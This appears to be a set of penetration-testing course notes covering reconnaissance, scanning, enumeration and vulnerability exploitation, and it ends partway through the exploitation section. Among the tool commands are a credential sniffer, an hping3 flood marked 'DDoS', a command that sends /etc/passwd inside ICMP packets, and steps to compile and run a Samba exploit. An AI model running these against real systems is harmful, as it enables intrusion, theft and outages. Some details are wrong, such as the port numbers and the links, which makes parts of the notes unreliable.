#
# Advance Penetration and Tactics.


## Contents
## 1.  [ Vulnerability ](APT.md#1.0).
###  [ Brief discussion on "what is vulnerability ?" ](APT.md#0)
### 1.1 [ Vulnerability assessment ](APT.md#1.1)
### 1.2 [ Challenges in APT ](APT.md#1.2)
### 1.3 [ Penetration testing ](APT.md#1.3)
### 1.4 [ Host scanner ](APT.md#1.4)
### 1.5 [ Network scanner ](APT.md#1.5)
### 1.6 [ Tasks for vulnerability scanners ](APT.md#1.6)
### 1.7 [ Network vulnerability scanning methods ](APT.md#1.7)
### 1.8 [ Port scanning ](APT.md#1.8)
### 1.9 [ Critical intelligence ](APT.md#1.9)
### 1.10 [ UDP port scans ](APT.md#1.10)
### 1.11 [ TCP port scans](APT.md#1.11)
### 1.12 [ Stealth scans ](APT.md#1.12)
### 1.13 [ Stack fingerprinting ](APT.md#1.13)
### 1.14 [ Tool  ](APT.md#1.14)
### 1.15 [ Enumeration ](APT.md#1.15)
### 1.16 [ Exploitation ](APT.md#1.16)
### 1.17 [ Intelligent scanning ](APT.md#1.17)
### 1.18 [ Creating security testing planning ](APT.md#1.18)
### 1.19 [ Testing security methods ](APT.md#1.19)
### 1.20 [ Hacking methodology ](APT.md#1.20)
#
## 2. [ Recon, footprinting  and information gathering ](APT.md#2.0)
### 2.1 [ Goal ](APT.md#2.1)
### 2.2 [ Information gathering ](APT.md#2.2)
### 2.3 [ Target discovery ](APT.md#2.3)
### 2.4 [ Kali tools ](APT.md#2.4)
### 2.5 [ Resources ](APT.md#2.5)
#
## 3. [ Scanning, enumeration and fingerprinting ](APT.md#3.0)
### 3.1 [ Goal ](APT.md#3.1)
### 3.2 [ Scanning analysis ](APT.md#3.2)
### 3.3 [ Scanning methodology ](APT.md#3.3)
### 3.4 [ Enumeration ](APT.md#3.4)
### 3.5 [ Target Ports ](APT.md#3.5)
### 3.6 [ Application and vendor ](APT.md#3.6)
### 3.7 [ Defense system ](APT.md#3.7)
#
## 4. [  Identify vulnerability on network ](APT.md#4.0)
### 4.1 [ Goal ](APT.md#4.1)
### 4.2 [  Network vulnerability scanning ](APT.md#4.2)
### 4.3 [  Scanner configuration ](APT.md#4.3)
### 4.4 [ Scanning tactics and tools ](APT.md#4.4)
### 4.5 [ Scan analysis at the local network level ](APT.md#4.5)
### 4.6 [ Websites for vulnerability check ](APT.md#4.6)
#
## 5. [  Vulnerability exploitation ](APT.md#5.0)
### 5.1 [ Goal ](APT.md#5.1)
### 5.2 [  Exploitation ](APT.md#5.2)
### 5.3 [  Remote password attack ](APT.md#5.3)
### 5.4 [  Exploit framework ](APT.md#5.4)
### 5.5 [ Payload ](APT.md#5.5)
#
## 6. [ Post exploitation ](APT.md#6.0)
### 6.1 [ Goals ](APT.md#6.1)
### 6.2 [ Local assessment ](APT.md#6.2)
### 6.3 [ Escalating privileges ](APT.md#6.3)
### 6.4 [ Linux privilege escalation ](APT.md#6.4)
### 6.5 [ Windows privilege escalation ](APT.md#6.5)
### 6.6 [ Files of interest ](APT.md#6.6)
### 6.7 [  Dev tools aftermath ](APT.md#6.7)
### 6.8 [ File transfer ](APT.md#6.8)
### 6.9 [ User/Group account evasion ](APT.md#6.9)
### 6.10 [  Exploit suggestion ](APT.md#6.10)
### 6.11 [ Malwar3 writing ](APT.md#6.11)
#
## 7. [ Evasion ](APT.md#7.0)
### 7.1 [ Evading defensive system ](APT.md#7.1)
### 7.2 [ Cover your tracks ](APT.md#7.2)
#
## 8. [ Advance tips and tactics ](APT.md#8.0)
### 8.1 [ Goal ](APT.md#8.1)
### 8.2 [ Creating and using proxychains ](APT.md#8.2)
### 8.3 [ Explore web shells ](APT.md#8.3)
### 8.4 [ Scanning  against defenses ](APT.md#8.4)
### 8.5 [ Pivoting ](APT.md#8.5)
### 8.6 [ Exploiting shellshock ](APT.md#8.6)
### 8.7 [ SCADA evasion ](APT.md#8.7)
### 8.8 [ ICS/SCADA modbus protocol](APT.md#8.8)
#
# <a name="1.0"></a>1. Vulnerability 
## <a name="0"></a>Brief discussion on " what is Vulnerability ?"
- Which violates the product.
- Attackers breaking into system.
- To check system.
- All system have vulnerability but not all have exploit.


## <a name="1.1"></a>1.1 Vulnerability assessment
- Running a vulnerability scanner manually.
- Compiling reports about vulnerability system.
- In penetration POC which vulnerability are on which system.
- What steps to mitigate organization.
- Which vulnerability. are likely to present risk to organization.

## <a name="1.2"></a>1.2 Challenges in APT
- Vulnerability scanner detect and prioritize vulnerability.
- Suggest solution for known vulnerability.
- Prioritize vulnerability based on their severity.
- vulnerability scanner do not know your network or system.
- Their output needs to be evaluated by real human.
- Assessing vulnerability require accurate knowledge of three area.
- The nature of a vulnerability or weakness.
- The real threats that can exploit or are exploiting the vulnerability.
- The consequences of a successful exploit on your organization.

## <a name="1.3"></a>1.3 Penetration testing
- Explore the possibility of exploits.
- Evaluate the effectiveness of security controls.
- Penetration testing uses a wide range of techniques.
- Acquire targets.
- Identify available services and topology.
- Enumerate user accounts, network shares, application versions.
- Discover vulnerability that can lead to exploit.
- Run exploit.

## <a name="1.4"></a>1.4 Host scanner 
- Host scanner run locally.
- System scanner.
- Inside OS.
- Can detect vulnerability and generate regular reports.
- Agents can be installed and generate regular reports.

## <a name="1.5"></a>1.5 Network scanner

* Network scanners probe systems remotely.
	* Looking for vulnerability that can be exploited remotely.
	* Mimics the access available to an external attackers.
* Many network scanners are standalone products.
	* A single user conducts scans from a single GUI.
	* Beyond trust retina.
	* Quialys.
* Some network scanner are deployed in a client/server model.
	* Client used to configure scans server conducts scans.
	* Nessus.
	* Rapid 7's NeXpose.

## <a name="1.6"></a>1.6 Tasks for vulnerability scanners
* Vulnerability scanner
	- Check ports version patch level.
	- Generate reports.
	- Manual Scanning.
	- Scanner tool.
	- Scanner automate the process.
	- Reduces the time needed to compile lists of vulnerable system.
	- Do not replace trained security people.
*  Auditing of new systems
	* Evaluate systems before they are brought online
* Validate compliance with security policy
* Discovery of unknown systems 
	* To detect configuration changes that create new vulnerabilities
* Educational
	* Might first learn of a vulnerability from scanner alerts.

## <a name="1.7"></a>1.7 Network vulnerability scanning methods.
* Three main methods used by network vulnerability scanners
	* Port scanning 
	* Live systems
	* Services and enumeration
	* Each technique introduces increasing risk to end systems
		*Port scanning should not crash a system

## <a name="1.8"></a>1.8 Port scanning
* Port Scanning determines which ports are listening on a targets.
	* Many network services run on established well-known ports.
	* FTP 21.
	* TELNET 23.
	* SMTP 25.
	* DNS 53 UDP/TCP.
	* Http 80.
## <a name="1.9"></a>1.9 Critical intelligence 
* Helps identify the applications in use.
* Narrows the search for exploitable vulnerabilities.
* TCP and UDP both include the concept of ports.
	* However different techniques are used to scan each protocol.

## <a name="1.10"></a>1.10 UDP port scans 

* UDP scans rely on negative feedback.
	* Packet with no payload is directed to a target ports.
	* If port is open no reply is received.
	* If port is closed target host sends ICMP Port Unreachable.

* DNS query on 53 receive reply.
* Type 3 code 3 port unreachable because port is unreachable.

## <a name="1.11"></a>1.11 TCP port scans
* Most TCP scans initiate and observe the TCP three way handshake.
	* Target port is sent a packet with the SYN flag set.
* RFC 793 specifies that every TCP host must respond.
	* Whether port is open or closed.
	* Getting no reply from the target is an exceptional condition.
* If port is closed target responds with RST/ACK.
* Indicates there is no software listening at that port.
* If no reply is received to a TCP SYN.
	* Something between scanner and target is dropping packets.
	* Traffic blocked by firewall system, router, or system software.

## <a name="1.12"></a>1.12 Stealth scans
* Stealth scans are a family of techniques that do one of the following:
	* Pass through firewall filtering rules.
	* Are not logged by the target.
	* Attempt to disguise probes as normal network traffic.
	* Most stealth scans probe TCP ports.
		* By sending packets with specific combination of TCP flags.
		* SYN/ACK. URG/PSH/FIN.  FIN  . NULL(no flag).
	* RFC 793 species how targets should respond to these probes.
		* Open port remain silent.
		* Closed ports send RST or RST/ACK.
	* Not every TCP/IP stack obeys the RFC.
		* Microsoft for example.
		* Limits the usefulness of stealth scans.

## <a name="1.13"></a>1.13 Stack fingerprinting

* Identify the targets OS.
	* By detecting subtle differences in TCP/IP stack implementation.

* Usually requires an open and closed port.
	* Specific probes are sent and replies are matched to a database.

* Stacks differ in how they respond to:
	* Unusual flag combinations.
	* SYN/FIN, No flags, all flags.
	* RST packets sent to open and closed ports.
		* Some stacks respond in both situations.
		* Other stacks do not.
	
## <a name="1.14"></a>1.14 Tool 
* nmap
	* Scan includes:
		* Ping sweeps.
		* Ports scans.
		* Stealth scans.
		* Includes stack fingerprinting capability.
	* More and more on every update and check for scripts.

## <a name="1.15"></a>1.15 Enumeration 

* Determining the configuration of individual targets.
	* User accounts, network shares, OS services.
	* Techniques are OS specific.

* UNIX systems are often enumerated using:
	* RPC on port 111.
		* Determine which RPC programs are available.
	* Send mail on port 25.
		* Determine user account using VRFY command.

* Windows systems are commonly enumerated using SMB.
	* Running under NetBIOS over TCP on port 139.
	* On newer Windows System, running natively on TCP port 445.

* Windows Null sessions.
	* Windows systems permit smb null sessions by default.
	* A blank user name and password are used as credentials.
	* Null sessions can be used to enumerate critical information.
	* By connecting to the built-in named pipe share, IPC$.

* Other.
* Observing the initial text sent by a server is called banner grabbing.
* Banner often indicates what software is running.
	* Software name and version.
* OS version.
	* Special features.

* SNMP can be used to enumerate router configuration.
	* Including router tables and access control lists using tools like.
	* snmpwalk.
	* requires the community name.
	
	`snmpwalk -Os -c public -v 1 target_ip`

* Limitations of banner grabbing.
	* Version information may not include patch level.
	* IIS doesn't output which updates have been applied.
	* Banner can be altered by administrator.
	* This should be done on all services that have a banner.
	* Sometimes there is no banner.
	* Especially with UDP services.
	
* Non intrusive probing.
	* Look for the vulnerability without causing damage.
	* Inject data that produces a known response.
	* May  or may not actually exploit vulnerability.
	* Traverse directories, but don't create new files.
	* Send format string that reads memory.
	* But do not write anything into that memory.

## <a name="1.16"></a> 1.16 Exploitation.
* Most vulnerabilities scanner can conduct intrusive tests.
* Which actually exploit the vulnerability that is being checked.
* May cause crashes and DoS.
* Scanners are configured to skip these tests by default.
* Usually require the operator to OK an alert before enabling.

## <a name="1.17"></a> 1.17 Intelligent Scanning

* First generation tools performed serial scans.
* Tests were run one after another.
* Each test ran in its own context.
* Required auditor to choose relevant tests.
	* Tools did not detect the type of server that they were Scanning.
	* IIS tests might be run against an Apache server.
* Next-generation tools became more intelligent.
* Use results from previous tests as input to later tests.
* Examples:
	* Conduct port scan and perform OS detection.
	* Determines specific vulnerability tests.
	* If vulnerability reveals information, use this in other tests.
	* If NULL session allowed, use resulting registry information.

## <a name="1.18"></a> 1.18 Creating security testing planning:
*  Defining goals in writing.
	* State specifically what should be achieved.
	* performing a security test must have authorization.
	
*  Establishing scope of work that frames.
	*	Time.
	*	Addresses.
	*	Networks directly involved and transited.
	*	Available targets.
	
* Marking off limits.
	* Some systems and network may be highly critical.
	
* Posting rules of enggagement.
	* Check outline policy like social engineering, DoS.
	
* Defining the deliverable.
	* Whether the project involves one host and one vulnerability, or a
	Site penetration test, results must be recorded and reported.

* Testing outlines.
* [NIST 800-115](www.isecom.org/osstmm)

> Client want to know what the risk is and how to mitigate the risk.

## <a name="1.19"></a> 1.19 Testing security methods
* War Games:
	* Red team vs blue team.
* Security testing: 
	* Light network evaluations.
	* Probing specific potential problem areas.
		* Host and network.
* Penetration testing:
	* Unannounced simulated attack.

##  <a name="1.20"></a>1.20 Hacking methodology
* Planning
	* A logical and tested strategy is essential to reach and compromise victims.
	* Research and record keeping are vital.
	* Discovering what works(and what does not).
	* The deliverable report.
#	
# <a name="2.0"></a>2. Recon, footprinting  and information gathering
## <a name="2.1"></a>2.1 Goal
* Discover the technical environment of the victim.
* Gather useful non or semi technical background information to be used later to refine attacks.
* Published and open information.

## <a name="2.2"></a>2.2 Information gathering
* Assets.
* Locations/networks.
* Services.
* Client and server applications.
* Technical detail regarding the infrastructure.
	* OS.
	* IP addressing.
	* Internal, External, DMZ.
	* DNS-StuffMail servers.
	
## <a name="2.3"></a>2.3 Target discover
* Steps taken to uncover the target information:
	* Gather initial target information.
	* Locate the network IP range.
	* Locate live machines.
	* Discover open ports/access points.
	* Services version and ports.
	* Map the network.

	* Registrars
		* ARIN
		* RIPENIC
		* APNIC
		* LACNIC
		* AFRNIC

	* Domain information 
		* whois.com 
	* Registry contact
	* nslookup

	* `$nslookup`
	
	* `server 8.8.8.8`  Google ip_address

	* `set type=any` Give me all the detail of the entered domain that we entered.
	
	* `domain_name` Than for the next level use the server ip address you got from the information.
	
	* DNS information
	* Four types of queries:
		1. Registrar query
			* Gives information on potential domain matching the target.
		2. Organizational query
			* Searches a specific registrar to obtain all instances of the targets name, showing many different company-associated domains.
		3. Domain query
			* Based on an organizational query of company-associated address, domain name, admin contact number, and system domain servers. The admin contact is useful to provide war dialer info and social engineering.
		4. Network query
			* American Registry for Internet Numbers(ARIN) or another register discover IP blocks.
## <a name="2.4"></a>2.4 Kali tools
* Information gathering
	* dnsenum
		* `dnsenum domain_name`

		* `dnsmap`

		* `dnsrecon`

		* `dnsrecon -t std -d domain_name` 
			* std = standard d= dump

		* If recursion enabled than it means weakness in name server.

	* dnstracer

		* dig
		* more powerful nslookup.
		* `dig -t ns domain_name`

	* dnswalk

	* fierce
		* It extracts subdomain with ip address.
		* Can conduct zone transwer as well
			* Rare in the networks of today (while tunlling).
		* Same process as 25 years ago.

	* netcraft
		* Website.
		* Internal domains as well as site information.
		* Not always accurate.

	* ThewayBackMachine
		* Maintains complete archive of web sites.
		* Not as google cache.
		* Can download software that is no longer available.

	* Shodan
		* Search engine for IOT.
		* Comprehensive queries.
			* Can locate data about the target.
			* Determine if the client has leaked sensitive information.
			* `query on search: "port 445"`

	* urlcrazy

	* Traceroute
		* Shows the path to target.
			* Windows
				* Uses icmp by default.
			* nix
				* Uses UDP by default.

	* Competitive intelligence gathering
		* Data gathering.
		* Data analysis.
		* Information verification.
		* Search Engine: Satellite and terrestrial photos.
		* Market research.
		* Government contracts.

	* Email addresses
		* Can enumerate email addresses and identify potential social engineering targets.
		* theHarvester
			* `theharvester -d domain_name -l 500 -b google -h test.html`
			* finds all the email in the website
		* Metagoofil
			* `metagoofil -d domain_name -l 20 -t doc,pdf -n 5 -f enum.html -o enum-scan`
			* Advanced search capability.
			* Downloads detected files.

		* Google dorks 
			* [Google Operators](https://googleguide.com/advanced_operators.html)

		* Bing dorks 
			* [Bing Operators](msdn.microsoft.com/en-us/library/ff795620.aspx)

		* Bishopfox
			* [Bishopfox](Bishopfox.com)
			* Success requires creativity in searches.
		* Maltego
			* Holygrail
## <a name="2.5"></a>2.5 Resources
* DNS-Stuff
* [The wayback machine](web.archive.org)
* [whois](whois.com)
* The victims own published information.
* Know what the organization user resume.
#
# <a name="3.0"></a>3. Scanning, enumeration and fingerprinting

## <a name="3.1"></a>3.1 Goal

* Discover the specific detail that will allow matching of present assets to vulnerabilities and exploits.
* Scanning is the active step of attempting to connect to systems to elicit a response.

* For penetration testing the response is the key.
	* SYN packet
		* port closed
			* RST
		* port open
			* SYN/ACK
		* Any other response
			* Some form of a device or firewall on the host.

## <a name="3.2"></a>3.2 Scanning analysis
* Send in TCP and get back ICMP
	* Filtering device or software is in place. we can check packets reach to destination or not.

## <a name="3.3"></a>3.3 Scanning methodology

* TCP connection
	* 3 way handshake creates a socket and establish the connection.
		* SYN
		* SYN,ACK
		* ACK
	* Half open scan
* Live systems
	* We have to have targets.
		* `-sP, -sn` in nmap

* netdiscover 
	* Checks for LAN.
	* Have to be on the local subnet.
	* Has a passive and active model.
	* Good for initial site contact.
		* Run on laptop while meeting clients. ;)
	* `netdiscover -r ip_address/range`
	* For passive.
		* `netdiscover -p` 
	* Listen the network.
		* `netdiscover -i eth0 -p` 
	* Enumerate the target without sending packets, we just have to sit on the network.
		* `netdiscover -i eth0 -p` 

* nmap host discovery
	* On local subnet uses ARP.
	* ICMP is often blocked and host discovery can fail.
	* Use TCP host discovery sweep.
	* `namp ip_address/range -PA80 -sn` 
	* `Ports`
		* What are the doors on these targets.
			* Remember all 0-65535 because nmap only gives us the * enumeration of 1000 ports only.

			* `-sS,-sT,-sU`  s= scan S= stealth scan; T= connect scan; U= UDP scan.
	* Services
		* What is behind these doors ???
			* `nmap -sV` 

	* Identifies all the machines , vmware switches etc and we can eliminate the vmware machines from targets.
		* `nmap -sP ip_address/range`
	* Check all the ports.
		* `nmap -sS ip_address/range`
	* Check services running on the system.
		* `nmap -sV ip_address`
	* Enumerate target with all options for output to get in xml.
		* `nmap -A ip_address` 
	* Go to nmap directory and then use this or just move the stylesheet to the current path.
		* `nmap -A ip_address -oX test.xml nmap.xsl` 
		* `nmap -sC ip_address`
	 
	* Using scripting engine to enumerate smb os.
		* `nmap --script smb-os-discovery ip_address`
	* Operating system detection there are tons of packet sent but find the alternative for this.
		* `nmap -O ip_address`

* TCP dump(Low level scanning)
	* Check its manual page.
	* Default is eth0 interface.
		* `tcpdump -x -A port 21`
	* Can find 3 way handshake.
		* `tcpdump -x TCP`
		* `tcpdump -dst ip_address`
	*  Open browser.
		* `tcpdump -nn -A -l|grep "User-Agent:"` 

* tshark
	* Check manual using.
		* `$ tshark man`
	
* dsniff
	* See only the credential on the network.
		* `dsniff` 
* unicornscan
	* Check manual using.
		* `unicornscan man`

* SSL Scan can check the ciphers to encrypt data , we can make traffic look like specific app using these cipher or if we have a vulnerability in the cipher than can exploit it.
	* `sslscan ip_address`
	* `sslscan --show-client-cas ip_address`
	* `sslscan --no-failed ip_address`
* ZMap
	* `zmap --bandwidth=1000M --target-port=445 --max-results=10000 --output-file=results.txt ip_address`
* Masscan
	* Fast scanner.
	* Designed to scan the internet.
	* Similar to zmap.
	* Installed by default on kali.
	* Can split the scan up and set times.
	* `masscan ip_address/range -p 80,445`
* Hping 
	* Hping is very powerful and fast, Master tool for crafting packet. More you learn hping more powerful you become.
	* Quick way to identify. 
	* `hping3 ipaddress --scan 0-65535 -S | more`
	* Example:
		* vi attack.sig {any content}
		* `hping3 -2 -p 500 ip_address -d 137 -E attack.sig` {2=UDP, * attackers port 500, 137 victim port -E attack.sig
		* Buffer overflow the port.
			* `hping3 -2 -p 500 ip_address -d 100 -E attack.sig`  
		* Scan all the ports.
			* `hping3 --scan known ip_address -S` 
		* Scan port from 1-3000.
			* `hping3 --scan '1-3000'`known ip_address -S` 
		* create icmp packet to send.
			* `hping3 127.0.0.1 --listen signature --safe --icmp`
			* `hping3 127.0.0.1 --icmp -d 100 --sign signature --file /etc/passwd`
		* DDoS
			* `hping3 --flood ip_address`
* Source port Scanning.
	* Select source port scan and you can potentially bypass stateless filters
		* Also in cisco routers the use of the "established" keyword (Ack==1) can indicate a weak ACL depending on the rule order.
	* Source ports that commonly bypass the filtering.
		* port 20 ftp.
		* port 53 DNS-Stuff.
		* port 80.
		* Options for source port selection.
			* nmap -gathering.
			* netcat -packet.
			* Metasploit -set CPORT.
				* Can get hta payload through the filtering device.

## <a name="3.4"></a>3.4 Enumeration
* Is used to gather more in depth information about the target, such as open shares and user account information.
	* For enumeration Scanning.
		* `nmap -sC -A` 
* Windows targets and Linux/Unix with Samba.

* `nbstat`

* nbtscan
	* Gives a netbios machines.
	* `nbtscan -v -s : ip_address/range`
	* If you see 1cG in the scan is a high value target.

* enum4Linux
	* If we see domain controllers than we can change our mac to that domain controller and can perform MITM attack.
	* `enum4Linux ip_address`

* Sparta
	* Runs all of the tools for you.
	* Like a portal for Scanning and enumeration along with others.

* wpscan
	* Word-press vulnerability scanner.
	* Can use for enumeration.
		* version
		* users
		* plugins
		* themes
	* `wpscan --url ip_address/wordpress --enumerate u --enumerate t --enumerate p` 
		* u=users; t=themes p=plugins

* Directory
	* Web servers may or may not expose their directories.
	* Kali has several tools for enumerating directories.
		* wfuzz
		* dirbuster

* Webapp technology
	* Have to determine what is running on the web servers to test it.
	* Whatweb.
		* Installed by default in kali.
		* 1700 plugins.
		* Supports different levels.
		* Passive(default)
			* -1
		* Polite
			* -2
		* Impolite-guess URL when plugin matches(smart, guess a few urls)
			* -3
		* Aggressive -guess URL for every plugin (guess a lot of urls like)
			* -4
		* `whatweb domain_name`

* SMB OS discovery
	* nmap has scripts.
		* `nmap --script smb OS-discovery.nse --script-args=unsafe=1 -p 445 ip_address`

* SNMP
	* It is a gift because its a db full of information and we can extract data from a single query. works on UDP. 
		* `nmap -sU -p 161 ip_address`
		* `snmpwalk -Os -c public -v 1 ip_address`
		* `check nmap scripts for snmp `
		* `/share/nmap/script$ ls | snmp`
* Manual banner grabbing.
	* Connect to the port and investigate the response.
		* TELNET
		* netcat
	* Check the version of the service running and exploit available or previous exploit.
	`nc -vn ip_address port_number]
	* Dimtry
		* We can grab banner
			* `dmitry -winsepo ip_address`
			* Email crawling
				* `dmitry -pb ip_address`
	
	###  Python program for banner grabbing.
		import scoket
		bangrab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		bangrab.connect(("ip_address",port_number))
		bangrab.recv(4096)
		bangrab.close()

## <a name="3.5"></a>3.5 Target ports
* TCP 43 
	* DNS zone transfer.
* UDP 137 
	* NetBIOS Name Service
		* 16th byte represents data that can identify the type of machine 1C
			* A domain controller and can be exploited.
* RCP 139 
	* NetBIOS session service(SMB over NetBIOS).
* UDP 161 
	* Simple Network Management Protocol (SNMP).
* TCP/UDP 389 
	* Lightweight Directory access protocol (LDAP).
* RCP 445 
	* SMB over TCP/IP
* TCP/UDP 3268 
	* Global catalog service.
* Identify Vulnerabilities.
	* Manual.
	* Tools.
* Exploit
	* Validation of the vulnerability.
	* Manual and tools.
* Services and client software.

## <a name="3.6"></a>3.6 Application and vendor
* Versions and revisions.
* Service packs and patching.
* Add-on modules.

## <a name="3.7"></a>3.7 Defense system
* Firewall
* Vendor
* Inbound and outbound ports allowed.
* IDS used *what the organization for detecting vulnerability.
#
# <a name="4.0"></a>4. Identify vulnerability on network
## <a name="4.1"></a>4.1 Goal 
* Discover the best or most likely way to compromise victims.
* Accurate enumeration makes this easier.
* Discuss Vulnerability Scanning.
	* Identify the attack surface.
	* Determine the risk.
	* Assets the severity of the findings .
	* Draft a report of the findings Develop a remediation plan.

## <a name="4.2"></a>4.2 Network vulnerability scanning
* Look at the data at the network level .
* Assess the services accessible to the scanner.
* The DMZ and other accessible zones are investigated.
* Review the protocol and traffic of the subnet ... routing.
* Determines the attack surface at the network layer and transport layer.
	* TCP
	* UDP
	
* Host Vulnerability Scanners.
	* Review the attack surface on the host machine.
	* Assessment of the applications that are installed.
	* An investigation of the process running on the machine.
	* Work best with credential.

## <a name="4.3"></a>4.3 Scanner configuration
* Usually involves setting scan parameters.
* Set the network protocols and ports to test.
* Identify the methods of host discovery (If ICMP is blocked than we have to move with TCP host discovery and than we make the policy).
* Create a policy for the actual environment.
* Most scanners have templates that assist.
* Review configuration of scanners.
* Scan Templates.

## <a name="4.4"></a>4.4 Scanning tactics and tools
* Nessus
	* Contains a large number of templates for different Scanning situations
	Dependent on the license that you are registered with.
	* Home
		* Limited templates.
	* Plugins are the audit is coded as a plugin within Nessus.
	* More than 80k plugins in Nessus.
	* Updating the plugins is critical.
	* Online
		* check updates every 24hrs.
	* Offline
		* Requires challenge and response codes.
		* Needs the key provided by the Tennable Nessus.
	* Plugin families.
		* Different plugins based on requirements.
			* OS.
			* Application.
	* Sub-plugins
		* Each plugin can have sub-plugins.
			* More granular information about the check.
	* Built-in policies.
		* Nessus provides a variety of scan templates.
		* Most commonly.
			* Basic network scan.
				* Provides a comprehensive scan for most networks.
				* Does not scan all 65536 ports.
					* Have to change the settings for that.
	* Check for available plugin.
		* Each plugin represents an audit check.
		* Access the plugins.
	* Custom Scan
		* When you elect to do a custom scan you have control over what plugins loaded, and you can manually select the ones you needed.
			* Makes more granular approach to the testing.
			* Can take time to configure.
			* You need to have knowledge of what you are looking for to get the best results.
	* Tailoring Scans
		* 5 groups
			* Discovery
				* Can select ports.
				* Speed.
				* Port scanner settings.
				* Protocols for pinging potential targets.
					* Useful when a firewall is on.
						* ICMP blocked by default.
			* Assessment
				* Can set more specific scan parameters.
			* Report
				* Two components.
					* Processing.
					* Output.
			* Advanced
				* Configure performance parameters.
				* Low bandwidth links.
		* Scan template
			* Read the user guide it defines the settings within each templates.
		* Scan analysis process.
			* Take the results and review themes.
			* Identify the points of weakness.
				* Hosts.
				* Protocol.
				* Application.
			* Investigate the listing of vulnerabilities.
			* Interrogate the vulnerability information.
		* Results
			* Hosts.
			* Vulnerabilities.
			* Remediation.
				* Maintains the list of required remediation for that scan configuration.
			* History.
				* Maintains a historical listing of the scans against that configuration.
					* IP.
					* Hostname.
					* Range.
					* Application.
* OpenVAS
	* OpenSource.
	* Fork of the original Nessus project.
	* Its powerful but takes more time than Nessus. (same developer)
	* OpenVAS Scan Tasks.
	* OpenVAS Port Configuration.
		* Similar to Nessus.
		* Contains plugins.
		* Same as Nessus concepts.
	* OpenVAS scan configuration .
		* Customize according to your target.
	* OpenVAS NVTs.
	* OpenVAS CVE.
	* OpenVAS OS Listing.
	* OpenVAS Host Listing.
	* OpenVAS Topology.
		* Shows the network map of the target machines that have been scanned.
	* OpenVAS Result.
	* OpenVAS Update.
		* `openvas-feed-update`
	* OpenVAS Reports.
* Scan analysis process.
	* Take the results and review themes.
	* Identify the points of weakness.
		* Hosts
			* Protocol.
			* Application.
		* Investigate the listing of vulnerabilities.
		* Interrogate the vulnerability information.
		* Evaluate the recommended solution.
			* Write your own report going through all the report.
			* See if Nessus has provided an output.
			* Output can be use this in your report as well.
		* Review the risk information and additional details.
			* CVSS.
			* Vulnerability information.
			* Exploitable with.
			* References.
		* Examine at least one reference.
			* CVE.
			* BID.
		* Review the information and compare to your scanner data.
		* BugtraqID.
			* Prioritize according to RCE or DoS.
			* Can show exploits as well.
		
## <a name="4.5"></a>4.5 Scan analysis at the local network level
* Before you scan a production network.
	* scan a test machine.
* Evaluate the Scanning activity at the network level.
	* Use a protocol analyzer.
* Tools
	* TCPdump
		* Command line.
	* Wireshark
		* GUI.
		* Advanced protocol dissection.
		* Has extensive capability.
		* Filtering
			* Can capture or display specific data based on packet attributes.
			(Analyze the response).
		* Capability to examine sessions (check the attack surface).
* Nessus in wireshark
	* Can review the network traffic sent to targets.
	* Allows us to determine the potential impact of a scan.
	* Can disable the plugins that we observe that may cause potential network problems.
	* Packet level skill allows us to master the scanner.
* Wireshark Statistics
	* Provide a view of the captured data.
	* Can see traffic from point to point.
	* Review the endpoint conversations.
	* HTTP Statistics.
		* Powerful way to view strings sent to HTTP (200 OK you have the vulnerability.)
## <a name="4.6"></a>4.6 Website vulnerability check
* [NIST](nvd.nist.gov)
* [CVE Details](cvedetails.com)
* [Security Focus](securityfocus.com)
	* Maintains the bugtrack ID
* [Zero Day](zerodayinitiative.com)
	* Disclose vulnerability without patch.

* Tools
	* Tools take time like days for Scanning.
	* OpenVAS -kali.
	* WebGoat like a beebox by OWASP.
	* Vega -kali.
		* enter ip_address

* Utilize enumeration data and corelate with vulnerabilities and exploits.
	Use known characteristics of the victims.
	* OS.
	* Applications.
	* DefensesMatch to available exploits	Not all exploits successfully attack all vulnerable targets.
	* Zero-day exploits are ideal.

# <a name="5.0"></a>5. Vulnerability Exploitation 

## <a name="5.1"></a>5.1 Goals:
* Discuss validation of vulnerabilities.
* Review exploit site.
* Identify vector attack.
* Explore exploit frameworks.

* Reality 
	* We have to have vulnerabilities.
	* Without them there is no hack.
	* The good news is all systems have some sort of flaws.
	* There are many exploit references and to get deep into it requires some .form of code understanding.
		* This takes time.
		* Not all want to get that deep into it.
		* Use frameworks etc.

* Operating system
	* There will still be flaws and bugs in any OS.
	* Fewer of them as time passes.
	* Windows Server 2016 is pretty tight.
	* Identify the attack surface and see the best fit.

##  <a name="5.2"></a>5.2 Exploitation 
* Validation of vulnerabilities
* Compromise the victim
	* Use vulnerabilities that were discovered during the methodology.
		* Not all vulnerabilities will be exploitable.
* Deliver the payload.
	* Once the victim is compromised what should happen.
		* Leave a record proving access.
		* Grab files, plant a keystroke logger, crack passwords etc.
* From this point of access.
	* Footprint and enumerate other systems.
	* Remember the rules of engagement (how much we can do after getting into machines).
* Exploit targets.
* Exploits are highly specific.
* Have to know the build and revision number .
	* Windows
		* Service pack.
	* Linux/Unix
		* Kernel Data.
* In Metasploit view with show targets.

* Data Collection.
* Collect enough data to .
	* Discover potential vulnerabilities.
		* Banners of the services.
			* SSMTP
			* SSH
			* HTTP/HTTPS
			* FTP
			* POP3
		* OS identification.
	* Choose the appropriate exploit to match the target.
		* Not an exact science.
	* Narrow the field of attack vectors.
		* Highest privilege result is preferred.
* Finding Exploits.
* We need to find exploits.
* Most vulnerability lists do not post exploits.
	* Except for bugtraq.
* Can use [Seclist](http://seclists.org/)
	* A complete listing of security sites and feeds.
* Ideal exploits are proof of concept (POC)
* Once you get the exploit.
	* Have to review it.
		* could be a trojan horse or other form of malware.
		* Rarely documented.
		* Require compilers or interpreters.
		* May not work.
	* Thoroughly test ie in a lab before deployment.

* Exploit db
	* [Exploit Database](www.exploit-db.com)
		* commonly have 0day exploits
		* [GNU Citizen](gnucitizen.org)
		* [Top site vulnerability](tposite.com/goto/securityvulns.com)
		* (Sell Code Database)[packerstormsecurity.com]
	* searchsploit kali tool
		* `searchsploit shellshock remote`
		* `[searchsploit samba remote` 
* Manual exploitation
	* nmap (gain information about target) 
	* `sslscan ip_address`
	* man smbclient (for samba smbclient -L ip_address)
	* `searchsploit samba remote`
	* `cd into the path of exploit of version`
	* `cp the file` 
	* `gcc exploit.c -o samba`
	* `./samba -b -v ip_address`

* If it is a compiled language.
	* Look for the readme file
	* Is there a configure file
		* `./configure`
		* `make`
		* `make install`
		* `make clean`
	* Compile the rest.
		* gcc -o <executable> <source>
* Scripting language
	* Load the code in an interpreter and test it.
	* Always test in a lab or sandboxed environment.
	* Analyze it at hte packet level.
* Full disclosure.
